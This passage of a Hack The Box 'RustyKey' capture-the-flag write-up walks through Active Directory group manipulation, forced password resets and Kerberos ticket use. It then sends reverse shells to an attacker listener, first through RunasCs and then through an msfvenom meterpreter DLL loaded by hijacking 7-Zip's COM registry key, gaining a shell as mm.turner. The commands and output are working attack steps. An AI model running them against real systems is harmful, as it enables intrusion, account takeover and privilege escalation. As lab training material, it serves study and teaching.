Before adding, we need to request **Ticket Granting Ticket** for `IT-COMPUTER3` computer account.

```bash
└─$ getTGT.py -dc-ip 10.129.4.62 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IT-COMPUTER3$.ccache
```

Activate the ticket.

```bash
└─$ export KRB5CCNAME=IT-COMPUTER3$.ccache
```

Let's add it.

```bash
└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember 'HELPDESK' 'IT-COMPUTER3$'
[+] IT-COMPUTER3$ added to HELPDESK
```

![BloodHound](/assets/img/rustykey-htb-season8/bloodhound_3.png)

We recall back to this part and see that in order to modify other users, we need to remove the `IT@RUSTYKEY.HTB` and `SUPPORT@RUSTYKEY.HTB` out of the `PROTECTED OBJECTS@RUSTYKEY.HTB` group. <br>
And if we `PROTECTED OBJECTS@RUSTYKEY.HTB`, we will see that.

![BloodHound](/assets/img/rustykey-htb-season8/bloodhound_4.png)

This group is a member of `PROTECTED USERS@RUSTYKEY.HTB` group and see the description that this group will be afforded additional protections of any modify like compromise credentials will be denied. <br>
Here is the [refs](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn466518(v=ws.11)?redirectedfrom=MSDN) to take a look at the documentation. <br>
Let's remove this group `PROTECTED OBJECTS@RUSTYKEY.HTB` out of two other group.

```bash
└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'Protected Objects' 'IT'
[-] IT removed from Protected Objects
```

We can able to modify `BB.MORGAN` and `GG.ANDERSON` password.

```bash
└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'Password@123'      
[+] Password changed successfully!
```

```bash
└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' set password gg.anderson 'Password@123'
[+] Password changed successfully!
```

Now let's request **Ticket Granting Ticket** for `BB.MORGAN` and `GG.ANDERSON` user.

```bash
└─$ getTGT.py -dc-ip 10.129.66.206 'rustykey.htb/gg.anderson:Password@123'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

For `GG.ANDERSON` user, we got error due to `KDC_ERR_CLIENT_REVOKED` which means that the client credentials have been revoked. <br>
&rarr; We gonna move on to `BB.MORGAN` user.

```bash
└─$ getTGT.py -dc-ip 10.129.4.62 'rustykey.htb/bb.morgan:Password@123'    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bb.morgan.ccache
```

Then activate new ticket.

```bash
└─$ export KRB5CCNAME=bb.morgan.ccache
```

```powershell
└─$ evil-winrm -i dc.rustykey.htb -u bb.morgan -r rustykey.htb       
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
No credentials found with supported encryption types (filename: bb.morgan.ccache)                                                                                                                                                           
                                                                                                                                                                                                                                            
                                        
Error: Exiting with code 1
```

We got error due to GSSAPI. I just doing those steps again and modified the `/etc/krb5.conf` file.

```bash
└─$ cat /etc/krb5.conf                                                        
[libdefaults]
    default_realm = RUSTYKEY.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = yes
    default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac des3-cbc-sha1
    default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac des3-cbc-sha1
    permitted_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac des3-cbc-sha1

[realms]
    RUSTYKEY.HTB = {
        kdc = dc.rustykey.htb
        admin_server = dc.rustykey.htb
    }

[domain_realm]
    .rustykey.htb = RUSTYKEY.HTB
    rustykey.htb = RUSTYKEY.HTB
```

Just in case of supported encryption types.

> Remmeber to `sudo rdate -n` and `klist` to make sure the time is sync and our ticket is the right one.

```powershell
└─$ evil-winrm -i dc.rustykey.htb -u bb.morgan -r rustykey.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> type user.txt
6377177a0406b0bf0e2b107786184d78
```

Able to access `bb.morgan` user and grab the `user.txt` flag.

## Initial Access
### Discovery
```powershell
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> dir


    Directory: C:\Users\bb.morgan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/4/2025   9:15 AM           1976 internal.pdf
-ar---        6/30/2025   9:23 AM             34 user.txt
```

We see that there is a `internal.pdf` file so let's download it.

```powershell
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> download internal.pdf
                                        
Info: Downloading C:\Users\bb.morgan\Desktop\internal.pdf to internal.pdf
                                        
Info: Download successful!
```

![Internal PDF](/assets/img/rustykey-htb-season8/internal_pdf.png)

This is like an email from `bb.morgan` to `support-team@rustykey.htb` that the `support-team` will have elevated registry permissions and temporary elevated rights. <br>
Checking back the bloodhound, we will notice that `ee.reed` is the member of `support-team@rustykey.htb` group.

![BloodHound](/assets/img/rustykey-htb-season8/bloodhound_5.png)

This `support-team` is also a member of `protected objects@rustykey.htb` group as we discuss earilier. <br>
So this pdf hint for us that we need to able to grab the `ee.reed` user so that we can escalate more.

To do that, we need to recall back the `IT-COMPUTER3` ticket.

```bash
└─$ export KRB5CCNAME=IT-COMPUTER3\$.ccache
```

Redo this adding.

```bash
└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember 'HELPDESK' 'IT-COMPUTER3$'
[+] IT-COMPUTER3$ added to HELPDESK
```

Remove the `protected objects@rustykey.htb` out of `support-team@rustykey.htb` group.

```bash
└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember "CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB" "SUPPORT"
[-] SUPPORT removed from CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB
```

> You can grab these `"CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB"` from the bloodhound.

Then reset the password of `ee.reed` user.

```bash
└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed 'P@ssword123'                                             
[+] Password changed successfully!
```

Let's grab the `ee.reed` ticket and activate it to connect via evil-winrm.

```bash
└─$ getTGT.py -dc-ip 10.129.4.62 'rustykey.htb/ee.reed:P@ssword123' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ee.reed.ccache
```

```bash
└─$ export KRB5CCNAME=ee.reed.ccache
```

```powershell
└─$ evil-winrm -i dc.rustykey.htb -u ee.reed -r rustykey.htb  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied
Success                                                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                                                            
                                        
Error: Exiting with code 1
malloc(): unaligned fastbin chunk detected
zsh: IOT instruction  evil-winrm -i dc.rustykey.htb -u ee.reed -r rustykey.htb
```

We can not login to `ee.reed`. Let's back to `bb.morgan` user.

```bash
└─$ export KRB5CCNAME=bb.morgan.ccache
```

Big Shoot out to [2ubZ3r0](https://app.hackthebox.com/users/682632) for helping me with this tool [RunasCs](https://github.com/antonioCoco/RunasCs) which will only need username/password, it will stealh the `ee.reed` token and then run the internal process under `ee.reed` context. 

### RunasCs
We will download the zip file from [RunasCs releases](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5) then extract out to grab the `RunasCs.exe` file. <br>
Gonna upload via `bb.morgan` through `evil-winrm`.

```powershell
*Evil-WinRM* PS C:\> mkdir Temp


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/30/2025   4:51 PM                Temp

*Evil-WinRM* PS C:\Temp> upload RunasCs.exe
                                        
Info: Uploading /home/kali/HTB_Labs/DEPTHS_Season8/RustyKey/RunasCs.exe to C:\Temp\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!
```

> Always create another folder `Temp` to upload instead of using those standard folder cause we do not know that those folder are begin tracked or not.

Now look for how to use this tool. Found this [article](https://arttoolkit.github.io/wadcoms/RunasCs/) or using `-h` to see the help menu. <br>
&rarr; We gonna run and our kali will start to listen on port `3333`.

```bash
└─$ rlwrap -cAr nc -lvnp 3333
listening on [any] 3333 ...
```

```powershell
*Evil-WinRM* PS C:\Temp> .\RunasCs.exe ee.reed P@ssword123 cmd.exe -r 10.10.14.59:3333
[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-25e9f9d$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2188 created in background.
```

```bash
└─$ rlwrap -cAr nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.10.14.59] from (UNKNOWN) [10.129.4.62] 49600
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
rustykey\ee.reed
```

We got the shell as `ee.reed` user.

Remember that we still have `mm.turner` user, let's recon in `ee.reed` to find the way to get there.

```bash
C:\Windows\system32>tasklist /svc
tasklist /svc

Image Name                     PID Services                                    
========================= ======== ============================================
System Idle Process              0 N/A                                         
System                           4 N/A                                         
Registry                        88 N/A                                         
smss.exe                       268 N/A                                         
csrss.exe                      372 N/A                                         
wininit.exe                    476 N/A                                         
csrss.exe                      484 N/A                                         
winlogon.exe                   548 N/A                                         
services.exe                   616 N/A                                         
lsass.exe                      636 Kdc, KeyIso, Netlogon, SamSs                
svchost.exe                    832 PlugPlay                                    
svchost.exe                    852 BrokerInfrastructure, DcomLaunch, Power,    
                                   SystemEventsBroker                          
svchost.exe                    888 RpcEptMapper, RpcSs                         
svchost.exe                    940 LSM                                         
svchost.exe                    312 lmhosts                                     
svchost.exe                    304 nsi                                         
svchost.exe                    340 W32Time                                     
svchost.exe                    692 NcbService                                  
svchost.exe                    768 TimeBrokerSvc                               
svchost.exe                    688 Dhcp                                        
svchost.exe                   1044 Dnscache                                    
dwm.exe                       1064 N/A                                         
svchost.exe                   1168 EventLog                                    
svchost.exe                   1204 BFE, mpssvc                                 
svchost.exe                   1328 NlaSvc                                      
svchost.exe                   1344 gpsvc                                       
svchost.exe                   1356 ProfSvc                                     
svchost.exe                   1372 EventSystem                                 
svchost.exe                   1388 Themes                                      
svchost.exe                   1472 SENS                                        
svchost.exe                   1524 Schedule                                    
svchost.exe                   1552 netprofm                                    
svchost.exe                   1592 DsmSvc                                      
svchost.exe                   1600 Wcmsvc                                      
svchost.exe                   1688 WinHttpAutoProxySvc                         
svchost.exe                   1696 IKEEXT                                      
svchost.exe                   1716 PolicyAgent                                 
svchost.exe                   1724 ShellHWDetection                            
svchost.exe                   1792 Winmgmt                                     
svchost.exe                   1900 FontCache                                   
svchost.exe                   2000 iphlpsvc                                    
svchost.exe                   2024 LanmanWorkstation                           
svchost.exe                   2148 UserManager                                 
svchost.exe                   2548 LanmanServer                                
fontdrvhost.exe               2796 N/A                                         
fontdrvhost.exe               2800 N/A                                         
spoolsv.exe                   1656 Spooler                                     
svchost.exe                   2124 CoreMessagingRegistrar                      
svchost.exe                   1176 CryptSvc                                    
svchost.exe                   1340 DiagTrack                                   
dns.exe                        660 DNS                                         
ismserv.exe                   2500 IsmServ                                     
svchost.exe                   2728 SstpSvc                                     
dfsrs.exe                     2744 DFSR                                        
Microsoft.ActiveDirectory     2752 ADWS                                        
svchost.exe                   2792 SysMain                                     
VGAuthService.exe             3124 VGAuthService                               
vm3dservice.exe               3140 vm3dservice                                 
vmtoolsd.exe                  3156 VMTools                                     
svchost.exe                   3172 WinRM                                       
svchost.exe                   3216 WpnService                                  
dfssvc.exe                    3328 Dfs                                         
svchost.exe                   3356 RasMan                                      
vm3dservice.exe               3496 N/A                                         
vds.exe                       3676 vds                                         
WmiPrvSE.exe                  3896 N/A                                         
dllhost.exe                   3932 COMSysApp                                   
msdtc.exe                     3904 MSDTC                                       
WmiPrvSE.exe                  4156 N/A                                         
sihost.exe                    5088 N/A                                         
svchost.exe                   5100 CDPUserSvc_4a32d                            
svchost.exe                   4504 WpnUserService_4a32d                        
taskhostw.exe                 4336 N/A                                         
svchost.exe                   4660 TokenBroker                                 
svchost.exe                   4876 TabletInputService                          
svchost.exe                   4972 StateRepository                             
ctfmon.exe                    4872 N/A                                         
svchost.exe                   5004 CDPSvc                                      
svchost.exe                   5268 AppXSvc                                     
ServerManager.exe             5816 N/A                                         
RuntimeBroker.exe             5884 N/A                                         
RuntimeBroker.exe             6000 N/A                                         
vmtoolsd.exe                  6512 N/A                                         
ApplicationFrameHost.exe      7012 N/A                                         
svchost.exe                   6464 seclogon                                    
svchost.exe                   2788 DPS                                         
svchost.exe                   3324 UALSVC                                      
svchost.exe                   1396 UsoSvc                                      
svchost.exe                   6624 WaaSMedicSvc                                
svchost.exe                   3908 LicenseManager                              
svchost.exe                    992 DsSvc                                       
svchost.exe                   6468 PcaSvc                                      
wsmprovhost.exe                904 N/A                                         
wsmprovhost.exe               5880 N/A                                         
wsmprovhost.exe               2380 N/A                                         
cmd.exe                       2188 N/A                                         
conhost.exe                   6040 N/A                                         
backgroundTaskHost.exe        1408 N/A                                         
powershell.exe                5308 N/A                                         
conhost.exe                   8412 N/A                                         
explorer.exe                  9008 N/A                                         
ShellExperienceHost.exe       8232 N/A                                         
tasklist.exe                  8284 N/A
```

This command will show all the process running on the machine so if there are some suspicious process or weird process, we can able to leverage them.

```bash
C:\Windows\system32>reg query "HKLM\Software\Classes\CLSID" /s | findstr "Access"
reg query "HKLM\Software\Classes\CLSID" /s | findstr "Access"
    (Default)    REG_SZ    DCOMAccessControl
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\CapabilityAccessHandlers.dll
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\CapabilityAccessHandlers.dll
    (Default)    REG_SZ    AudioAccessibility Class
    (Default)    REG_SZ    System.MemberAccessException
    Class    REG_SZ    System.MemberAccessException
    (Default)    REG_SZ    System.MemberAccessException
    (Default)    REG_SZ    FsrmAccessDeniedRemediationClient Class
    (Default)    REG_SZ    Fsrm.FsrmAccessDeniedRemediationClient.1
    (Default)    REG_SZ    Fsrm.FsrmAccessDeniedRemediationClient
    (Default)    REG_SZ    OOBE HidAccessoryPairing Wizard Page
    (Default)    REG_SZ    Routing and Remote Access
    (Default)    REG_SZ    Routing and Remote Access
    (Default)    REG_SZ    Routing and Remote Access
    (Default)    REG_SZ    SlideAccessor
    (Default)    REG_SZ    FileRandomAccessStreamStaticsBrokered
    (Default)    REG_SZ    Set Program Access and Defaults
    (Default)    REG_SZ    User Access Logging Provider
    (Default)    REG_SZ    C:\Program Files\Windows NT\Accessories\WordpadFilter.dll
    (Default)    REG_SZ    CLSID_BackgroundAccessManager
    ProgrammaticAccessOnly    REG_SZ    
    (Default)    REG_SZ    BackgroundAccessManagerService
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\CapabilityAccessHandlers.dll
    LocalizedString    REG_EXPAND_SZ    @%SystemRoot%\system32\AccessibilityCpl.dll,-6000
    (Default)    REG_EXPAND_SZ    %SystemRoot%\System32\AccessibilityCpl.dll
    (Default)    REG_SZ    System.AccessViolationException
    Class    REG_SZ    System.AccessViolationException
    (Default)    REG_SZ    System.AccessViolationException
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\CapabilityAccessHandlers.dll
    (Default)    REG_SZ    C:\Program Files\Windows NT\Accessories\WordpadFilter.dll
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\MsRdpWebAccess.dll
    (Default)    REG_SZ    MsRdpWebAccess.MsRdpClientShell.1
    (Default)    REG_SZ    MsRdpWebAccess.MsRdpClientShell
    (Default)    REG_SZ    Routers or Remote Access Servers
    (Default)    REG_SZ    WinSAT Accessibility Object
    (Default)    REG_SZ    Shared Access Connection UI Class
    (Default)    REG_SZ    FileRandomAccessStream
    LocalizedString    REG_EXPAND_SZ    @%ProgramFiles%\Windows NT\Accessories\WORDPAD.EXE,-209
    LocalizedString    REG_EXPAND_SZ    @%ProgramFiles%\Windows NT\Accessories\WORDPAD.EXE,-209
    LocalizedString    REG_EXPAND_SZ    @%ProgramFiles%\Windows NT\Accessories\WORDPAD.EXE,-57344
    (Default)    REG_EXPAND_SZ    "%ProgramFiles%\Windows NT\Accessories\WORDPAD.EXE",1
    (Default)    REG_EXPAND_SZ    "%ProgramFiles%\Windows NT\Accessories\WORDPAD.EXE"
    LocalizedString    REG_EXPAND_SZ    @%ProgramFiles%\Windows NT\Accessories\WORDPAD.EXE,-6300
    LocalizedString    REG_EXPAND_SZ    @%ProgramFiles%\Windows NT\Accessories\WORDPAD.EXE,-6301
    (Default)    REG_SZ    System.UnauthorizedAccessException
    Class    REG_SZ    System.UnauthorizedAccessException
    (Default)    REG_SZ    System.UnauthorizedAccessException
    (Default)    REG_SZ    DirectAccess Media Manager
    (Default)    REG_SZ    DeviceAccessPolicyManager
    (Default)    REG_SZ    System.MethodAccessException
    Class    REG_SZ    System.MethodAccessException
    (Default)    REG_SZ    System.MethodAccessException
    (Default)    REG_SZ    Accessibility Control Panel
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\CapabilityAccessHandlers.dll
    (Default)    REG_SZ    Accessibility Dock
    Class    REG_SZ    System.Security.AccessControl.PrivilegeNotHeldException
    (Default)    REG_SZ    ADs Access Control Entry Object
    (Default)    REG_SZ    AccessControlEntry
    (Default)    REG_SZ    ADs Access Control List Object
    (Default)    REG_SZ    AccessControlList
    (Default)    REG_SZ    Shared Access Connection Manager
    (Default)    REG_SZ    Shared Access Connection Manager Enumerated Connection
    (Default)    REG_SZ    Shared Access Connection
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\CapabilityAccessHandlers.dll
    (Default)    REG_SZ    System.FieldAccessException
    Class    REG_SZ    System.FieldAccessException
    (Default)    REG_SZ    System.FieldAccessException
    (Default)    REG_SZ    Accessible Keyboard UI Class
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\CapabilityAccessHandlers.dll
    (Default)    REG_SZ    CRandomAccessStreamReferenceProxy
    (Default)    REG_SZ    Ease of Access
    System.ApplicationName    REG_SZ    Microsoft.EaseOfAccessCenter
    (Default)    REG_SZ    CLSID_AccessibilityExperienceManager
    (Default)    REG_SZ    RandomAccessStream Wrapper Marshaller
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\CapabilityAccessHandlers.dll
    (Default)    REG_SZ    Microsoft Direct Access WMI Provider
    (Default)    REG_SZ    Windows.Internal.CapabilityAccess Proxy
    (Default)    REG_SZ    C:\Windows\System32\CapabilityAccessManagerClient.dll
    (Default)    REG_SZ    AssignedAccess Admin Helper
```

For this one, the purpose is to check the registry key that is related to the `Access` and `UnauthorizedAccess` and see if there are any suspicious key cause of the PDF hint.

### 7-Zip

Afer a while recon, found out there is a `7-Zip` folder in `C:\Program Files\` and check out the `readme.txt` file.

```bash
C:\Program Files\7-Zip> type readme.txt
7-Zip 24.08
-----------

7-Zip is a file archiver for Windows.

7-Zip Copyright (C) 1999-2024 Igor Pavlov.

The main features of 7-Zip:

  - High compression ratio in the new 7z format
  - Supported formats:
     - Packing / unpacking: 7z, XZ, BZIP2, GZIP, TAR, ZIP and WIM.
     - Unpacking only: APFS, AR, ARJ, Base64, CAB, CHM, CPIO, CramFS, DMG, EXT, FAT, GPT, HFS,
                       IHEX, ISO, LZH, LZMA, MBR, MSI, NSIS, NTFS, QCOW2, RAR,
                       RPM, SquashFS, UDF, UEFI, VDI, VHD, VHDX, VMDK, XAR, Z and ZSTD.
  - Fast compression and decompression
  - Self-extracting capability for 7z format
  - Strong AES-256 encryption in 7z and ZIP formats
  - Integration with Windows Shell
  - Powerful File Manager
  - Powerful command line version
  - Localizations for 90 languages


7-Zip is free software distributed under the GNU LGPL (except for unRar code).
Read License.txt for more information about license.


  This distribution package contains the following files:

  7zFM.exe      - 7-Zip File Manager
  7-zip.dll     - Plugin for Windows Shell
  7-zip32.dll   - Plugin for Windows Shell (32-bit plugin for 64-bit system)
  7zg.exe       - GUI module
  7z.exe        - Command line version
  7z.dll        - 7-Zip engine module
  7z.sfx        - SFX module (Windows version)
  7zCon.sfx     - SFX module (Console version)

  License.txt   - License information
  readme.txt    - This file
  History.txt   - History of 7-Zip
  7-zip.chm     - User's Manual in HTML Help format
  descript.ion  - Description for files

  Lang\en.ttt   - English (base) localization file
  Lang\*.txt    - Localization files


---
End of document
```

Searching it out and found some CVEs relate to this version `24.08` [CVE-2025-0411](https://www.cvedetails.com/cve/CVE-2025-0411/) and [cve-2025-0411-detection-7-zip-vulnerability](https://www.vicarius.io/vsociety/posts/cve-2025-0411-detection-7-zip-vulnerability). <br>
&rarr; Decided to run check version to see if this machine is use this version.

```powershell
PS C:\Program Files\7-Zip> $version = (Get-Item "C:\Program Files\7-Zip\7z.exe").VersionInfo.ProductVersion
PS C:\Program Files\7-Zip> Write-Host "7-Zip Version: $version"
7-Zip Version: 24.09
```

> You can use `powershell` for easy usage.

Found out that the version is `24.09` which is already patched.

Gonna use [accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) which is a great tool to check the access and permissions of user and group.

### Registry Key
We need to download the `accesschk.exe` and then upload via `evil-winrm`.
```bash
C:\Temp>accesschk.exe -k -q -w "SUPPORT" HKCR\CLSID -accepteula
accesschk.exe -k -q -w "SUPPORT" HKCR\CLSID -accepteula

Accesschk v6.15 - Reports effective permissions for securable objects
Copyright (C) 2006-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}
```

We see that the `SUPPORT` user have `RW` access to the `HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}` key. <br>
Then we gonna use [inprocserver32](https://learn.microsoft.com/en-us/windows/win32/com/inprocserver32) to check the path to **DLL** file that will be loaded and process to provide COM object.

```bash
C:\Temp>accesschk.exe -k -q "SUPPORT" "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -accepteula
accesschk.exe -k -q "SUPPORT" "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -accepteula

Accesschk v6.15 - Reports effective permissions for securable objects
Copyright (C) 2006-2022 Mark Russinovich
Sysinternals - www.sysinternals.com
```

Do not get anything, let's try with `reg query` to see the path to **DLL** file.

```bash
C:\Temp>reg query "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve
reg query "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll
```

We see that the path is `C:\Program Files\7-Zip\7-zip.dll`. <br>
Now we use [Get-ACL](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.5) to check the access of the **DLL** file.

```powershell
PS C:\Temp> Get-Acl "HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" | Select -ExpandProperty Access | Where-Object {$_.IdentityReference -like "*Support*"}
Get-Acl "HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" | Select -ExpandProperty Access | Where-Object {$_.IdentityReference -like "*Support*"}


RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : RUSTYKEY\Support
IsInherited       : True
InheritanceFlags  : ContainerInherit
PropagationFlags  : None
```

We see that the `SUPPORT` user have `FullControl` access to the `HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32` key. <br>
&rarr; We can able to modify the **DLL** file and try to force the machine to load our malicious **DLL** which we will get privilege escalation to higher privilege.

### Privilege Escalation
### COM Hijacking
Let's review for a normal 7-Zip COM Loading process.
```markdown
# User opens .zip file in Explorer
# Windows needs archive handler
# Looks up 7-Zip CLSID: {23170F69-40C1-278A-1000-000100020000}
# Reads: HKCR\CLSID\{...}\InprocServer32\(Default) 
# Loads: "C:\Program Files\7-Zip\7-zip.dll"
# Calls: DllMain() in legitimate 7-zip.dll
```

After the COM Hijacking.
```markdown
# Same trigger (user opens .zip file)
# Same CLSID lookup
# Modified registry: InprocServer32\(Default) = "C:\Temp\info.dll"
# Loads: "C:\Temp\evil.dll" instead
# Calls: DllMain() in MALICIOUS DLL = PWNED!
```

This is one of the attack vector from [T1546.015](https://attack.mitre.org/techniques/T1546/015/) which is a privilege escalation technique. And I also found this [com-hijacking-enhancing-red-team-persistence-strategies](https://wizardcyber.com/com-hijacking-enhancing-red-team-persistence-strategies/) which is a great article to understand more about this technique.

Let's create a malicious **DLL** file with [msfvenom](https://github.com/ParrotSec/metasploit-framework/blob/master/msfvenom).

```bash
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.59 LPORT=2222 -f dll -o info.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: info.dll
```

Now prepare for the handler.

```bash
└─$ sudo msfconsole -q                                                                             
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.59
LHOST => 10.10.14.59
msf6 exploit(multi/handler) > set LPORT 2222
LPORT => 2222
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.14.59:2222
```

Upload the `info.dll` to the `C:\Temp` folder.

```powershell
*Evil-WinRM* PS C:\Temp> upload info.dll
                                        
Info: Uploading /home/kali/HTB_Labs/DEPTHS_Season8/RustyKey/info.dll to C:\Temp\info.dll
                                        
Data: 12288 bytes of 12288 bytes copied
                                        
Info: Upload successful!
```

Run the `info.dll` with this command.

```bash
C:\Temp>reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Temp\info.dll" /f
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Temp\info.dll" /f
The operation completed successfully.
```

*Some explanation about the command.* <br>
- **`reg add`**: Windows registry modification command.
- **`HKLM\Software\Classes\CLSID`**: COM object registry root.
- **`{23170F69-40C1-278A-1000-000100020000}`**: 7-Zip CLSID (confirmed vulnerable).
- **`\InprocServer32`**: Subkey containing DLL path.
- **`/ve`**: Modify default (empty name) value.
- **`/d "C:\Temp\info.dll"`**: New DLL path (malicious payload).
- **`/f`**: Force overwrite without confirmation.

Wait for a second, fact that need to wait for a while to get the `meterpreter` session. <br>

```bash
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.14.59:2222 
[*] Sending stage (203846 bytes) to 10.129.4.62
[*] Meterpreter session 1 opened (10.10.14.59:2222 -> 10.129.4.62:53105) at 2025-07-01 08:27:11 -0400

meterpreter > shell
Process 14240 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows> whoami
whoami
rustykey\mm.turner
```

### RBCD Abuse

So we are now `mm.turner` user. Checking back the BloodHound, we see that the `mm.turner` user is a member of `DELEGATIONMANAGER@RUSTYKEY.HTB` group.

![BloodHound](/assets/img/rustykey-htb-season8/bloodhound_6.png)

![BloodHound](/assets/img/rustykey-htb-season8/bloodhound_7.png)

Recall back, we have discussed that `DELEGATIONMANAGER@RUSTYKEY.HTB` has **AddAllowedToAct** permission to `DC.RUSTYKEY.HTB`. <br>
